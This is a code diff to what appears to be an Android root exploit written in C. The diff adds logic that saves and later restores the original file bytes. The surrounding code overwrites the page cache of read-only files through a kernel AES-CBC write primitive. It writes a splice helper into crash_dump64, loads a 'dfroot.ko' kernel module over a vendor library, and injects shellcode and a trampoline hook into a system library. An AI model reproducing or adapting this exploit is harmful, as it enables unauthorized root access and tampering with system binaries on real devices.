@@ -37,6 +37,20 @@ struct PatchRestore {
 
 static struct PatchRestore g_libcxx_r;
 
+/* Original file content captured while patching, restored in cleanup().
+ * Reverse iteration order matters: vendor files must be restored through
+ * the crash_dump bridge before crash_dump64 itself is un-spliced. */
+struct FileRestore {
+    const char *path;
+    char       *orig;
+    size_t      len;
+    int         use_helper;
+    int         valid;
+};
+
+static struct FileRestore g_file_restore[2];
+static size_t             g_nfile_restore;
+
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
  *   = AES_DEC(key, old_content) XOR IV
@@ -150,10 +164,12 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
  * Writes in 16-byte CBC blocks.
  * For system files (use_helper=0): reads old_content with pread().
  * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
+ * If save is non-NULL, len bytes of the original content are captured into
+ * it (one block per write) so cleanup() can restore the file afterwards.
  * len must be a multiple of 16.
  */
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
-                           size_t foff, int use_helper) {
+                           size_t foff, int use_helper, uint8_t *save) {
     if (len % 16 != 0) {
         printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
         return -1;
@@ -212,6 +228,8 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
                 rc = -1; break;
             }
         }
+        if (save)
+            memcpy(save + i * 16, old_content, 16);
 
         uint8_t desired[16] = {0};
         memcpy(desired, payload + i * 16, 16);
@@ -317,15 +335,30 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
     return buf;
 }
 
+/* Queue a restore entry so cleanup() can put the original bytes back. */
+static void save_file_restore(const char *path, char *orig, size_t len, int use_helper) {
+    if (g_nfile_restore >= sizeof(g_file_restore) / sizeof(g_file_restore[0])) {
+        free(orig);
+        return;
+    }
+    g_file_restore[g_nfile_restore++] = (struct FileRestore){
+        .path = path, .orig = orig, .len = len, .use_helper = use_helper, .valid = 1,
+    };
+}
+
 /* Write splicehelper into crash_dump64 page cache. */
 static int patch_helper(void) {
     size_t len;
     char *buf = pad16(splice_helper_start,
                       (size_t)(splice_helper_end - splice_helper_start), &len);
     if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
+    char *orig = malloc(len);
+    if (!orig) printf("patch: crash_dump64 - restore save alloc failed\n");
     printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
-    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
-    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0, (uint8_t *)orig);
+    if (ret) { free(buf); free(orig); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+    if (orig)
+        save_file_restore(kCrashDump, orig, len, 0);
 
     uint8_t verify[16];
     int vfd = open(kCrashDump, O_RDONLY);
@@ -358,22 +391,40 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+    char *orig = malloc(len);
+    if (!orig) printf("patch: %s - restore save alloc failed\n", libcxx_ko_target);
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
-    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
+    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1, (uint8_t *)orig);
     free(buf);
-    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
-    return ret;
+    if (ret) {
+        free(orig);
+        printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
+        return ret;
+    }
+    if (orig)
+        save_file_restore(libcxx_ko_target, orig, len, 1);
+    return 0;
 }
 
 static void cleanup(void) {
-    if (!g_libcxx_r.valid) return;
     printf("\n=== cleanup ===\n");
+    /* Restore in reverse patch order: the vendor ko file first (still needs
+     * the crash_dump bridge), crash_dump64 itself last. */
+    for (size_t i = g_nfile_restore; i-- > 0;) {
+        struct FileRestore *fr = &g_file_restore[i];
+        if (!fr->valid) continue;
+        printf("restoring %s\n", fr->path);
+        patch_file_cbc(fr->path, fr->orig, fr->len, 0, fr->use_helper, NULL);
+        free(fr->orig);
+        fr->valid = 0;
+    }
+    if (!g_libcxx_r.valid) return;
     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
     patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
-                   (size_t)g_libcxx_r.tramp_aligned, 0);
+                   (size_t)g_libcxx_r.tramp_aligned, 0, NULL);
     printf("restoring shellcode in %s\n", g_libcxx_r.lib);
     patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
-                   (size_t)g_libcxx_r.shell_off, 0);
+                   (size_t)g_libcxx_r.shell_off, 0, NULL);
 }
 
 int find_hook_target(const char *lib, const char *sym,
@@ -424,7 +475,7 @@ static int patch_hook(const char *lib, const char *sym,
     restore->valid         = 1;
 
     printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
-    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
+    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, NULL);
     free(buf);
     if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
 
@@ -433,7 +484,7 @@ static int patch_hook(const char *lib, const char *sym,
     memcpy(blk, restore->tramp_orig, 16);
     memcpy(&blk[pos], &hook_insn, 4);
     printf("patch: %s <- trampoline (16 bytes)\n", lib);
-    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
+    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, NULL);
     if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
     return ret2;
 }
